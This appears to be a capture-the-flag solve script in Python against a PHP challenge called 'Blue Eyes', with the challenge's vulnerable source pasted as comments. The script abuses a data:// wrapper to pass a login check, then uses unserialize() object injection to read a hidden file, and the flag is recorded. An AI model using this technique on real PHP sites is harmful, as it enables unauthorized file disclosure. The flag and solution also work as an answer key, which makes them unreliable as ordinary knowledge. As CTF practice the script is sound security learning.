import requests
import base64

url = 'http://35.184.20.243:8009/'
user = 'data://text/plain;base64,' + base64.b64encode('please let me in master gblq1337'.encode()).decode()
file = 'class.php'

r = requests.get(url, params={
    'user': user,
    'file': file,
    'secretword': 'O:13:"FileProcessor":1:{s:8:"filename";s:23:"Th1S-1S-s3Cr3t-f1le.php";}'
})

# //CTFS{Unserialize_is_RCE_Feature}

print(r.text)
# index.php
# <!DOCTYPE HTML>
# <title>Blue Eyes</title>
# <head>
#     <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/css/bootstrap.min.css" integrity="sha384-BVYiiSIFeK1dGmJRAkycuHAHRg32OmUcww7on3RYdg4Va+PmSTsz/K68vbdEjh4u" crossorigin="anonymous">
# </head>
# <html>
# <body>
#     <img src="dragon.jpg" />
#     <div class="label label-info col-md-12 text-center">
#         <?php
#             $filename = $_GET["file"];
#             $user = isset($_GET["user"]) ? $_GET["user"] : "hacker";
#             $secretword = $_GET["secretword"];
#
#             if(file_get_contents($user,'r')==="please let me in master gblq1337"){
#                 echo "Welcome Back, My Master!!!";
#                 if(preg_match("/Th1S-1S-s3Cr3t-f1le/",$filename)){
#                     die("Are you hacker???");
#                 }else{
#                     include($filename); //class.php
#                     $pwd = unserialize($secretword);
#                     echo $pwd;
#                 }
#             }else if(file_get_contents($user, 'r')=="please let me in master gblq1234"){
# 		echo "Hello, guest :)";
# 	    }else{
#                 echo "<h1>Hey, you didn't supposed to be here, please get out!!!</h1>";
#                 echo "Tell me your secret word";
#             }
#
#         ?>
#     </div>
# </body>
# </html>
# <!--
# $filename = $_GET["file"];
# $user = isset($_GET["user"]) ? $_GET["user"] : "hacker";
# $secretword = $_GET["secretword"];
#
# if(file_get_contents($user,'r')==="please let me in master gblq1337"){
#     echo "Welcome Back, My Master!!!";
#     include($filename); //class.php
# }else if(file_get_contents($user,'r')==="please let me in master gblq1234"){ // guest.txt
#     echo "Hello guest :)";
# }else{
#     echo "<h1>Hey, you didn't supposed to be here, please get out!!!</h1>";
#     echo "Tell me your secret word";
# }
# -->

# class.php
# <?php
#
#     class FileProcessor{
#     	/**
#     	 * [$filename variable used to read the content from]
#     	 * @var [string]
#     	 * this file maybe help you : Th1S-1S-s3Cr3t-f1le.php
#     	 */
#         public $filename;
#         public function __toString(){
#             if(isset($this->filename)){
#                 echo file_get_contents($this->filename);
#             }
#             return "__toString was called!";
#         }
#     }
# ?>
